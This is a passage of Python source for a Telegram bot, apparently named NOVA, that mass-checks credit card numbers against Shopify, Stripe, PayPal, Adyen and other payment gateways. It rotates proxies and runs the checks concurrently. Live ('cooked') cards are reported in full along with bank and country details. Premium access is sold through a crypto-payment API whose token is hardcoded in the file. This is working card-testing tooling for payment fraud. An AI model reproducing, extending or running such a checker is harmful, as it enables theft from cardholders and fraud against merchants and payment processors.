        proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
        
        # CONCURRENT CHECKING WITH ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=10) as executor:
            # Submit all cards for checking
            futures = {
                executor.submit(check_card_concurrent, cc, filtered_sites, proxy, check_function, max_retries=3): idx
                for idx, cc in enumerate(ccs)
            }
            
            # Process results as they complete
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results_list = results
                    
                    # Categorize result
                    if result['status'] == 'APPROVED':
                        results['cooked'].append(result)
                        update_stats('APPROVED', mass_check=True)
                    elif result['status'] == 'APPROVED_OTP':
                        results['approved'].append(result)
                        update_stats('APPROVED_OTP', mass_check=True)
                    elif result['status'] in ['DECLINED', 'EXPIRED']:
                        results['declined'].append(result)
                        update_stats('DECLINED', mass_check=True)
                    elif result['status'] == 'TIMEOUT':
                        results['timeout'].append(result)
                    else:
                        results['error'].append(result)
                        update_stats('ERROR', mass_check=True)
                    
                    processed_count += 1
                    
                    # Update progress every 2 seconds
                    if time.time() - last_update > 2:
                        progress_msg = format_progress_update(
                            processed_count, total_ccs,
                            len(results['cooked']), len(results['approved'])
                        )
                        try:
                            bot.edit_message_text(
                                progress_msg,
                                message.chat.id,
                                status_msg.message_id,
                                parse_mode='HTML'
                            )
                        except:
                            pass
                        last_update = time.time()
                
                except Exception as e:
                    logger.error(f"Result processing error: {e}")
                    processed_count += 1
                    continue
        
        # Calculate final stats
        duration = time.time() - start_time
        total_cooked = len(results['cooked'])
        total_approved = len(results['approved'])
        total_declined = len(results['declined'])
        total_errors = len(results['error'])
        total_timeouts = len(results['timeout'])
        
        # Send final results
        final_msg = format_final_results_txt(
            total_cooked, total_approved, total_declined,
            total_errors, total_timeouts, total_ccs, duration
        )
        
        try:
            bot.edit_message_text(
                final_msg,
                message.chat.id,
                status_msg.message_id,
                parse_mode='HTML'
            )
        except:
            bot.send_message(message.chat.id, final_msg, parse_mode='HTML')
        
        # Send cooked cards in separate message (if any)
        if results['cooked']:
            cooked_msg = format_cooked_cards_detailed(results['cooked'])
            bot.send_message(message.chat.id, cooked_msg, parse_mode='HTML')
        
        # Send approved cards (if any)
        if results['approved']:
            approved_msg = format_approved_cards_detailed(results['approved'])
            bot.send_message(message.chat.id, approved_msg, parse_mode='HTML')
        
        return results
    
    except Exception as e:
        logger.error(f"Mass check failed: {traceback.format_exc()}")
        bot.send_message(
            message.chat.id,
            f"❌ <b>ERROR</b>: {str(e)}",
            parse_mode='HTML'
        )
        return results


# ============================================================================
# 7. FORMATTING FUNCTIONS
# ============================================================================

def format_progress_update(processed, total, cooked, approved):
    """Format live progress update"""
    percent = (processed / total * 100) if total > 0 else 0
    bar_length = 20
    filled = int(bar_length * processed / total) if total > 0 else 0
    bar = '█' * filled + '░' * (bar_length - filled)
    
    return f"""
┏━━━━━━━⍟
┃ <b>𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆</b> ⚡
┗━━━━━━━━━━━⊛

<code>{bar}</code>
<b>Progress:</b> {processed}/{total} ({percent:.1f}%)

<b>Results So Far:</b>
[⌬] <b>𝐂𝐨𝐨𝐤𝐞𝐝</b>↣ {cooked} 🔥
[⌬] <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b>↣ {approved} ✅

⏳ Processing...
"""


def format_final_results_txt(cooked, approved, declined, errors, timeouts, total, duration):
    """Format final results"""
    speed = (total / duration) if duration > 0 else 0
    
    return f"""
┏━━━━━━━⍟
┃ <b>✅ MASS CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛

<b>━━━ RESULTS ━━━</b>
[⌬] <b>𝐂𝐨𝐨𝐤𝐞𝐝</b>↣ {cooked} 🔥
[⌬] <b>𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝</b>↣ {approved} ✅
[⌬] <b>𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝</b>↣ {declined} ❌
[⌬] <b>𝐓𝐢𝐦𝐞𝐨𝐮𝐭</b>↣ {timeouts} ⏱️
[⌬] <b>𝐄𝐫𝐫𝐨𝐫𝐬</b>↣ {errors} ⚠️

<b>━━━ STATS ━━━</b>
[⌬] <b>𝐓𝐨𝐭𝐚𝐥</b>↣ {total}
[⌬] <b>𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧</b>↣ {duration:.2f}s
[⌬] <b>𝐒𝐩𝐞𝐞𝐝</b>↣ {speed:.1f} checks/sec

━━━━━━━━━━━━━━━━━━━━
"""


def format_cooked_cards_detailed(cooked_list):
    """Format cooked cards with full BIN details"""
    if not cooked_list:
        return "No cooked cards found"
    
    message = "┏━━━━━━━⍟\n┃ <b>🔥 COOKED CARDS FOUND! 🔥</b>\n┗━━━━━━━━━━━⊛\n\n"
    
    for idx, card in enumerate(cooked_list[:15], 1):
        cc = card['cc']
        cc_parts = cc.split('|')
        masked_cc = f"{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}"  # ← Full CC
        
        bin_info = card.get('bin_info', {})
        
        message += f"""
<b>[{idx}] Cooked Card</b>
[⌬] <b>𝐂𝐂</b>↣ <code>{masked_cc}</code>
[⌬] <b>𝐁𝐫𝐚𝐧𝐝</b>↣ {bin_info.get('brand', 'UNKNOWN')} {bin_info.get('type', 'UNKNOWN')}
[⌬] <b>𝐁𝐚𝐧𝐤</b>↣ {bin_info.get('bank', 'UNKNOWN')}
[⌬] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b>↣ {bin_info.get('country_name', 'UNKNOWN')} {bin_info.get('country_flag', '🇺🇳')}
[⌬] <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b>↣ {card['gateway']} [${card['price']}]
[⌬] <b>𝐒𝐢𝐭𝐞</b>↣ {card['site']}
[⌬] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b>↣ {card['response']}

"""
    
    if len(cooked_list) > 15:
        message += f"... and {len(cooked_list) - 15} more cooked cards\n"
    
    message += "━━━━━━━━━━━━━━━━━━━━"
    return message


def format_approved_cards_detailed(approved_list):
    """Format approved cards (OTP required) with BIN details"""
    if not approved_list:
        return "No approved cards found"
    
    message = "┏━━━━━━━⍟\n┃ <b>✅ APPROVED CARDS (OTP) ✅</b>\n┗━━━━━━━━━━━⊛\n\n"
    
    for idx, card in enumerate(approved_list[:15], 1):
        cc = card['cc']
        cc_parts = cc.split('|')
        masked_cc = f"{cc_parts[0]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}"
        
        bin_info = card.get('bin_info', {})
        
        message += f"""
<b>[{idx}] Approved Card</b>
[⌬] <b>𝐂𝐂</b>↣ <code>{masked_cc}</code>
[⌬] <b>𝐁𝐫𝐚𝐧𝐝</b>↣ {bin_info.get('brand', 'UNKNOWN')} {bin_info.get('type', 'UNKNOWN')}
[⌬] <b>𝐁𝐚𝐧𝐤</b>↣ {bin_info.get('bank', 'UNKNOWN')}
[⌬] <b>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</b>↣ {bin_info.get('country_name', 'UNKNOWN')} {bin_info.get('country_flag', '🇺🇳')}
[⌬] <b>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</b>↣ {card['gateway']} [${card['price']}]
[⌬] <b>𝐒𝐢𝐭𝐞</b>↣ {card['site']}
[⌬] <b>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</b>↣ {card['response']}

"""
    
    if len(approved_list) > 15:
        message += f"... and {len(approved_list) - 15} more approved cards\n"
    
    message += "━━━━━━━━━━━━━━━━━━━━"
    return message

@bot.message_handler(commands=['addproxies'])
def handle_add_proxies(message):
    """Owner-only command to bulk add proxies from a .txt file."""
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "🚫 Owner only command.")
        return
    # Prompt user to send a .txt file
    bot.reply_to(message, "📂 <b>Send a .txt file containing proxies.</b>\n\n"
                          "Format: <code>ip:port:user:pass</code> (or <code>ip:port</code> if no auth)\n"
                          "One proxy per line.",
                          parse_mode='HTML')
    bot.register_next_step_handler(message, process_proxy_file_upload)
# ============================================================================
# 8. TXT FILE HANDLER & MESSAGE HANDLERS
# ============================================================================

# def setup_txt_mass_check_handler(bot, filtered_sites_func, proxies_data, check_function, is_valid_response, process_response, update_stats):
#     """
#     Setup TXT file mass checking handler
    
#     Add to your main app.py:
#     setup_txt_mass_check_handler(bot, get_filtered_sites, proxies_data, check_site, is_valid_response, process_response, update_stats)
#     """
    
#     global uploaded_ccs
#     uploaded_ccs = []
    
#    @bot.message_handler(content_types=['document'])
#     def handle_file_upload(message):
#         """Handle .txt file upload"""
#         try:
#             global uploaded_ccs
            
#             if not message.document.file_name.endswith('.txt'):
#                 bot.reply_to(message, "❌ Only .txt files allowed!")
#                 return
            
#             # Read file directly to memory (NO DOWNLOAD)
#             file_content = read_telegram_file_to_memory(bot, message.document.file_id)
            
#             if not file_content:
#                 bot.reply_to(message, "❌ Could not read file!")
#                 return
            
#             # Extract CCs
#             ccs = extract_ccs_from_text(file_content)
            
#             if not ccs:
#                 bot.reply_to(message, "❌ No valid CCs found!\n\nFormat: <code>CC|MM|YYYY|CVV</code>", parse_mode='HTML')
#                 return
            
#             # Analyze patterns
#             stats = analyze_cc_patterns(ccs)
#             uploaded_ccs = ccs
            
#             # Show preview with BIN analysis
#             preview = "\n".join([f"✅ {cc.split('|')[0][:6]}****{cc.split('|')[0][-4:]}" for cc in ccs[:5]])
#             if len(ccs) > 5:
#                 preview += f"\n... and {len(ccs)-5} more"
            
#             response = f"""
# ┏━━━━━━━⍟
# ┃ <b>✅ FILE UPLOADED!</b>
# ┗━━━━━━━━━━━⊛

# [⌬] <b>𝐓𝐨𝐭𝐚𝐥 𝐂𝐂𝐬</b>↣ {stats['total_ccs']}
# [⌬] <b>𝐔𝐧𝐢𝐪𝐮𝐞 𝐁𝐈𝐍𝐬</b>↣ {stats['unique_bins']}
# [⌬] <b>𝐌𝐚𝐱 𝐃𝐮𝐩𝐥𝐢𝐜𝐚𝐭𝐞</b>↣ {stats['max_duplicate']} ({stats['duplicate_percent']}%)

# <b>Preview:</b>
# {preview}

# ➡️ <b>Run:</b> <code>/msh</code> to start mass checking
# """
#             bot.send_message(message.chat.id, response, parse_mode='HTML')
#             print(f"✅ Loaded {len(ccs)} CCs from {message.document.file_name}")
        
#         except Exception as e:
#             bot.reply_to(message, f"❌ Error: {str(e)}")
#             logger.error(f"File upload error: {e}")
    

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    """Instantly stops the current mass check for this chat."""
    chat_id = message.chat.id
    set_stop(chat_id)
    bot.reply_to(message,
        "⏸️ <b>Stop requested.</b>\n\n"
        "• Pending cards cancelled.\n"
        "• Current card finishes soon.\n"
        "• Unchecked cards will be saved.\n\n"
        "<i>Please wait...</i>",
        parse_mode='HTML')


@bot.message_handler(commands=['cleanfile'])
def handle_clean_file(message):
    if not is_owner(message.from_user.id):
        return

    # Ask the user to upload a .txt file
    msg = bot.reply_to(message, "📂 Please upload the .txt file you want to clean.")
    bot.register_next_step_handler(msg, process_clean_file)

def process_clean_file(message):
    try:
        if not message.document or not message.document.file_name.endswith('.txt'):
            bot.reply_to(message, "❌ Please send a .txt file.")
            return

        status_msg = bot.reply_to(message, "⏳ Processing file...")
        file_info = bot.get_file(message.document.file_id)
        file_data = bot.download_file(file_info.file_path)
        content = file_data.decode('utf-8', errors='ignore')

        # Extract URLs: matches any http/https URL
        # This regex captures typical URLs and also handles trailing backslashes
        urls = re.findall(r'https?://[^\s]+', content)
        # Clean up: remove trailing backslashes, quotes, etc.
        cleaned_urls = []
        for url in urls:
            # Remove trailing backslash if present
            url = url.rstrip('\\')
            # Remove any trailing punctuation (like . or ,) but keep the URL
            url = url.rstrip('.,;:')
            # Ensure it's a valid URL
            if url.startswith(('http://', 'https://')):
                cleaned_urls.append(url)

        # Remove duplicates
        cleaned_urls = list(dict.fromkeys(cleaned_urls))

        if not cleaned_urls:
            bot.edit_message_text("❌ No valid URLs found in the file.", message.chat.id, status_msg.message_id)
            return

        # Write cleaned URLs to a new file
        filename = "cleaned_sites.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("\n".join(cleaned_urls))

        with open(filename, 'rb') as f:
            bot.send_document(
                message.chat.id,
                f,
                caption=f"✅ Extracted {len(cleaned_urls)} site URLs.\n\nYou can now upload this file via /addurls."
            )
        os.remove(filename)
        bot.delete_message(message.chat.id, status_msg.message_id)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


def test_proxy_quick_connect(proxy):
    """Quick test to see if proxy is reachable"""
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            proxy_dict = {'http': proxy_url, 'https': proxy_url}
            
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=5,
                verify=False
            )
            return response.status_code == 200
    except:
        pass
    return False

def format_message(cc, response, status, gateway, price, bin_info, user_id, full_name, time_taken, proxy_used=None):
    emoji = status_emoji.get(status, '⚠️')
    status_msg = status_text.get(status, '𝐄𝐫𝐫𝐨𝐫')
    
    cc_parts = cc.split('|')
    card_number = cc_parts[0]
    
    if bin_info:
        card_info = bin_info.get('brand', 'UNKNOWN') + ' ' + bin_info.get('type', 'UNKNOWN')
        issuer = bin_info.get('bank', 'UNKNOWN')
        country = bin_info.get('country_name', 'UNKNOWN')
        flag = bin_info.get('country_flag', '🇺🇳')
    else:
        card_info = 'UNKNOWN'
        issuer = 'UNKNOWN'
        country = 'UNKNOWN'
        flag = '🇺🇳'
    
    # Add proxy status
    if proxy_used:
        proxy_status = "Shining 🔆"
    else:
        proxy_status = "Dead 🚫"
    
    safe_name = full_name.replace("<", "").replace(">", "")  
    user_mention = f'<a href="tg://user?id={user_id}">{safe_name}</a>'
    
    message = f"""
┏━━━━━━━⍟
┃ <strong>{status_msg}</strong> {emoji}
┗━━━━━━━━━━━⊛

[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐚𝐫𝐝</strong>↣<code>{cc}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response}</code>
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐫𝐚𝐧𝐝</strong>↣{card_info}
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐚𝐧𝐤</strong>↣{issuer}
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐨𝐮𝐧𝐭𝐫𝐲</strong>↣{country} {flag}
━━━━━━━━━━━━━━━━━━━
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲</strong>↣ {user_mention}
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐁𝐨𝐭 𝐁𝐲</strong>↣ <a href="tg://user?id={DARKS_ID}">⏤‌‌Unknownop ꯭𖠌</a>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐓𝐢𝐦𝐞</strong>↣ {time_taken} <strong>𝐬𝐞𝐜𝐨𝐧𝐝𝐬</strong>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐲</strong>↣<strong>{proxy_status}</strong>
"""
    return message

# Format mass check message
def format_mass_message(cc, response, status, gateway, price, index, total, proxy_used=None):
    emoji = status_emoji.get(status, '⚠️')
    status_msg = status_text.get(status, '𝐄𝐫𝐫𝐨𝐫')
    
    # Add proxy status
    if proxy_used:
        proxy_status = "Shining 🔆"
    else:
        proxy_status = "Dead 🚫"
    
    # Extract card details (mask for security)
    cc_parts = cc.split('|')
    masked_cc = f"{cc_parts[0][:6]}******{cc_parts[0][-4:]}|{cc_parts[1]}|{cc_parts[2]}|{cc_parts[3]}"
    
    message = f"""
┏━━━━━━━⍟
┃ <strong>{status_msg}</strong> {emoji} <strong>•</strong> {index}/{total}
┗━━━━━━━━━━━⊛

[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐂𝐚𝐫𝐝</strong>↣<code>{masked_cc}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐆𝐚𝐭𝐞𝐰𝐚𝐲</strong>↣{gateway} [{price}$]
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞</strong>↣ <code>{response}</code>
[<a href="https://t.me/Nova_bot_update">⌬</a>] <strong>𝐏𝐫𝐨𝐱𝐲</strong>↣{proxy_status}
━━━━━━━━━━━━━━━━━━━
"""
    return message

def update_stats(status, mass_check=False):
    global stats_data
    
    # Define default stats structure
    default_stats = {
        'approved': 0, 'declined': 0, 'cooked': 0, 'error': 0,
        'mass_approved': 0, 'mass_declined': 0, 'mass_cooked': 0, 'mass_error': 0
    }
    
    # Load current stats (or use defaults if file missing/corrupt)
    try:
        stats_data = load_json(STATS_FILE, default_stats)
    except:
        stats_data = default_stats.copy()
    
    # Ensure all required keys exist
    for key in default_stats.keys():
        if key not in stats_data:
            stats_data[key] = 0
    
    # Increment the appropriate counter
    if status in ['APPROVED', 'APPROVED_OTP']:
        if mass_check:
            stats_data['mass_approved'] += 1
        else:
            stats_data['approved'] += 1
    elif status == 'COOKED':
        if mass_check:
            stats_data['mass_cooked'] += 1
        else:
            stats_data['cooked'] += 1
    elif status in ['DECLINED', 'EXPIRED']:
        if mass_check:
            stats_data['mass_declined'] += 1
        else:
            stats_data['declined'] += 1
    elif status == 'ERROR':
        if mass_check:
            stats_data['mass_error'] += 1
        else:
            stats_data['error'] += 1
    # Ignore any other status (like 'STOPPED')
    
    # Save stats back to file/DB
    save_json(STATS_FILE, stats_data)
    
    total = sum(stats_data.values())
    print(f"📊 STATS ({total}): {status} | Approved: {stats_data['approved'] + stats_data['mass_approved']}")

# Get sites based on price filter
def get_filtered_sites():
    global price_filter
    if not price_filter:
        return sites_data['sites']
    
    try:
        max_price = float(price_filter)
        return [site for site in sites_data['sites'] if float(site.get('price', 0)) <= max_price]
    except:
        return sites_data['sites']


# ============================================================================
# CONFIGURATION
# ============================================================================
# Put your CryptoBot API Token here!
CRYPTO_BOT_TOKEN = "557807:AA4641NI4yVxQBXTrX7sg6X79O7Qqo5w741" 
ADMIN_USERNAME = "Unknown_bolte" # Do not include the @

def create_crypto_invoice(amount, currency="USDT", description=""):
    """Talks to CryptoBot API to generate a fresh payment link AND invoice ID"""
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_BOT_TOKEN}
    payload = {"asset": currency, "amount": amount, "description": description}
    try:
        response = requests.post(url, headers=headers, data=payload)
        data = response.json()
        if data["ok"]:
            # We now return BOTH the link and the unique ID
            return data["result"]["pay_url"], data["result"]["invoice_id"]
    except Exception as e:
        print(f"Error creating invoice: {e}")
    return None, None

# ============================================================================
# 🚀 ULTRA-PREMIUM START MENU – REFERRAL + NAME PROMOTION
# ============================================================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.from_user.first_name or "User"
    chat_id = message.chat.id
    user_id = message.from_user.id

    # Handle referral deep link
    if message.text and message.text.startswith('/start ref_'):
        try:
            referrer_id = int(message.text.split('_')[1])
            if referrer_id != user_id:
                add_referral(referrer_id, user_id)
                bot.send_message(referrer_id, f"🎉 <b>New Referral!</b>\nUser <code>{user_id}</code> joined using your link!", parse_mode='HTML')
        except:
            pass

    # Determine user status
    user_str = str(user_id)
    is_premium = False
    if user_str in users_data:
        try:
            expiry = datetime.fromisoformat(users_data[user_str]['expiry'])
            if expiry > datetime.now():
                is_premium = True
        except:
            pass

    status_badge = "💎 PREMIUM" if is_premium else "🆓 FREE"
    name_ok = has_required_username(message.from_user)
    ref_link = get_referral_link(user_id)
    ref_count = len(referrals_data.get(user_str, {}).get("referred", []))

    # --- Beautiful Loading Animation ---
    loading_frames = [
        "⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ 0%",
        "🟦⬛⬛⬛⬛⬛⬛⬛⬛⬛ 10%",
        "🟦🟦⬛⬛⬛⬛⬛⬛⬛⬛ 20%",
        "🟦🟦🟦⬛⬛⬛⬛⬛⬛⬛ 30%",
        "🟦🟦🟦🟦⬛⬛⬛⬛⬛⬛ 40%",
        "🟦🟦🟦🟦🟦⬛⬛⬛⬛⬛ 50%",
        "🟦🟦🟦🟦🟦🟦⬛⬛⬛⬛ 60%",
        "🟦🟦🟦🟦🟦🟦🟦⬛⬛⬛ 70%",
        "🟦🟦🟦🟦🟦🟦🟦🟦⬛⬛ 80%",
        "🟦🟦🟦🟦🟦🟦🟦🟦🟦⬛ 90%",
        "🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦 100%"
    ]

    msg = bot.send_message(chat_id, "✨ <i>Initializing NOVA Core...</i>", parse_mode='HTML')
    for frame in loading_frames:
        time.sleep(0.12)
        try:
            bot.edit_message_text(
                f"<b>🚀 NOVA is waking up...</b>\n\n<code>{frame}</code>",
                chat_id, msg.message_id, parse_mode='HTML'
            )
        except:
            pass
    time.sleep(0.3)
    bot.edit_message_text("✅ <b>System Online. Welcome!</b>", chat_id, msg.message_id, parse_mode='HTML')
    time.sleep(0.4)

    welcome_text = f"""
<pre>┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  <b>🔥   N O V A   ·   V E R I F Y   🔥</b>  ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛</pre>

<b>👋 Welcome, {html.escape(user_name)}!</b>
<b>📊 Status:</b> {status_badge}

<pre>┌─────────────────────────────────┐
│ <b>📌  GET FREE PREMIUM</b>           │
├─────────────────────────────────┤
│ 🔹 Refer 3 friends → 1 free day │
│ 🔹 Put <code>@Nova_V4bot</code> in name → 3 days │
└─────────────────────────────────┘</pre>
"""
    if not is_premium and not name_ok:
        welcome_text += "\n⚠️ <b>Action Required:</b> Add <code>@Nova_V4bot</code> to your Telegram name to use checks.\n"

    welcome_text += f"""
<b>🔗 Your Referral Link:</b>
<code>{ref_link}</code>
👥 <b>Referrals:</b> {ref_count} (3 = 1 free day)

<i>Share this link. When 3 friends join, you get 1 day premium!</i>
"""

    footer = "\n\n<pre>━━━━━━━━━━━━━━━━━━━━━━━━━</pre>\n<i>⚡ NOVA · <a href=\"tg://user?id=5963548505\">⏤‌‌Unknownop ꯭𖠌</a></i>"
    full_text = welcome_text + footer

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("💳 Single Check", callback_data="menu_single_gate"),
        types.InlineKeyboardButton("📦 Mass Check", callback_data="menu_mass_gate")
    )
    markup.add(
        types.InlineKeyboardButton("🛡️ Proxy Manager", callback_data="menu_proxy"),
        types.InlineKeyboardButton("🌐 Site Manager", callback_data="menu_sites")
    )
    markup.add(
        types.InlineKeyboardButton("💎 Plans & Upgrade", callback_data="show_plans"),
        types.InlineKeyboardButton("👤 Account", callback_data="show_info")
    )
    markup.add(
        types.InlineKeyboardButton("📖 Help", callback_data="show_help"),
        types.InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
    )
    if is_owner(user_id):
        markup.add(types.InlineKeyboardButton("👑 Owner Panel", callback_data="show_owner"))

    bot.edit_message_text(full_text, chat_id, msg.message_id, parse_mode='HTML', reply_markup=markup)


# ============================================================================
# NAME REQUIREMENT HELP CALLBACK
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data == "help_name_requirement")
def help_name_callback(call):
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        "<b>📌 How to add @Nova_V4bot to your name:</b>\n\n"
        "1️⃣ Open Telegram <b>Settings</b>\n"
        "2️⃣ Tap <b>Edit Profile</b>\n"
        "3️⃣ Add <code>@Nova_V4bot</code> to your <b>First Name</b> or <b>Last Name</b>\n"
        "4️⃣ Save and return here\n\n"
        "<i>Example: John @Nova_V4bot</i>\n\n"
        "✅ Once done, try your command again!",
        parse_mode='HTML'
    )


# ============================================================================
# GATE SELECTION MENUS
# ============================================================================
@bot.callback_query_handler(func=lambda call: call.data == "menu_single_gate")
def single_gate_menu(call):
    bot.answer_callback_query(call.id)
    
    help_text = """
<pre>┌─────────────────────────────────┐
│      💳  SINGLE  CHECK  GATES    │
└─────────────────────────────────┘</pre>

<b>Working commands:</b>

<code>/sh CC|MM|YYYY|CVV</code> – 🛍️ Shopify (Multi‑Site)
<code>/stripe CC|MM|YYYY|CVV</code> – 💳 Stripe Auth
<code>/chk CC|MM|YYYY|CVV</code> – 💳 Stripe Auth (alias)
<code>cook CC|MM|YYYY|CVV</code> – 🛍️ Shopify (alias)

<b>Example:</b> <code>/stripe 4000000000000002|12|2028|123</code>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start"))
    
    bot.edit_message_text(
        help_text,
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        parse_mode='HTML',
        reply_markup=markup
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("single_"))
def single_gate_chosen(call):
    gate_key = call.data.replace("single_", "")
    user_id = call.from_user.id
    if user_id not in user_sessions:
        user_sessions[user_id] = {}
    user_sessions[user_id]['single_gate'] = gate_key
    bot.answer_callback_query(call.id)
    bot.send_message(
        call.message.chat.id,
        f"📝 <b>Send me a card for {get_gate_display_name(gate_key)}</b>\n\n"
        "Format: <code>CC|MM|YYYY|CVV</code>",
        parse_mode='HTML'
    )
    bot.register_next_step_handler(call.message, process_single_gate_check)


def get_gate_display_name(gate_key):
    names = {
        "shopify": "Shopify", "pp": "PayPal Fixed", "pp2": "PayPal General",
        "stripe": "Stripe Auth", "b3": "B3 Auth", "ch": "Chaos Auth",
        "ad": "Adyen Auth", "ap": "App Auth", "pf": "Payflow",
        "ra": "Random Auth", "shop": "Shopify API", "skrill": "Skrill",
        "st": "Stripe API", "arc": "Arcenus", "rst": "Random Stripe",
        "rz": "RazorPay", "pu": "PayU", "sk": "SK Gateway", "ppay": "PayPal API"
    }
    return names.get(gate_key, gate_key.upper())


def process_single_gate_check(message):
    user_id = message.from_user.id
    gate_key = user_sessions.get(user_id, {}).get('single_gate', 'shopify')
    gate_map = {
        "pp": (check_paypal_fixed, "PayPal"),
        "pp2": (check_paypal_general, "PayPal"),
        "stripe": (check_stripe_api, "Stripe Auth"),
        "b3": (check_b3_auth, "Stripe Auth"),       # /chk points here
        "ch": (check_chaos, "Chaos Auth"),
        "ad": (check_adyen, "Adyen Auth"),
        "ap": (check_app_auth, "App Auth"),
        "st": (check_stripe_onyx, "Stripe Auth"),
        "arc": (check_arcenus, "Arcenus"),
        "ppay": (check_paypal_onyx, "PayPal (Onyx)"),
        }
    if gate_key in gate_map:
        gate_func, gate_name = gate_map[gate_key]
        handle_onyx_gate(message, gate_func, gate_name)
    else:
        # Fallback to Shopify single check
        handle_cc_check(message)


@bot.callback_query_handler(func=lambda call: call.data == "menu_mass_gate")
def mass_gate_menu(call):
    bot.answer_callback_query(call.id)
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🛍️ Shopify Multi", callback_data="run_mass_shopify"),
        types.InlineKeyboardButton("🛍️ My Sites", callback_data="run_mass_mysites")
    )
    markup.add(
        types.InlineKeyboardButton("💰 PayPal Fixed", callback_data="run_mass_paypal_fixed"),
        types.InlineKeyboardButton("💰 PayPal General", callback_data="run_mass_paypal_general")
    )
    markup.add(
        types.InlineKeyboardButton("💳 Stripe Auth", callback_data="run_mass_stripe"),
        types.InlineKeyboardButton("🔷 B3 Auth", callback_data="run_mass_b3_auth")
    )
    markup.add(
        types.InlineKeyboardButton("🌀 Chaos Auth", callback_data="run_mass_chaos"),
        types.InlineKeyboardButton("🔷 Adyen Auth", callback_data="run_mass_adyen")
    )
    markup.add(
        types.InlineKeyboardButton("📱 App Auth", callback_data="run_mass_app_auth"),
        types.InlineKeyboardButton("💸 Payflow", callback_data="run_mass_payflow")
    )
    markup.add(
        types.InlineKeyboardButton("🎲 Random Auth", callback_data="run_mass_random"),
        types.InlineKeyboardButton("🛍️ Shopify (Ext)", callback_data="run_mass_shopify_onyx")
    )
    markup.add(
        types.InlineKeyboardButton("💰 Skrill", callback_data="run_mass_skrill"),
        types.InlineKeyboardButton("⚡ Stripe (Ext)", callback_data="run_mass_stripe_onyx")
    )
    markup.add(
        types.InlineKeyboardButton("🌐 Arcenus", callback_data="run_mass_arcenus"),
        types.InlineKeyboardButton("🎲 Random Stripe", callback_data="run_mass_random_stripe")
    )
    markup.add(
        types.InlineKeyboardButton("💳 RazorPay", callback_data="run_mass_razorpay"),
        types.InlineKeyboardButton("🔷 PayU", callback_data="run_mass_payu")
    )
    markup.add(
        types.InlineKeyboardButton("🔑 SK Gateway", callback_data="run_mass_sk_gateway"),
        types.InlineKeyboardButton("💸 PayPal (Ext)", callback_data="run_mass_paypal_onyx")
    )
    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_start"))

    info_text = """
<pre>┌─────────────────────────────────┐
│      📦  MASS  CHECK  GATES      │
└─────────────────────────────────┘</pre>

<b>🔹 How to Mass Check:</b>
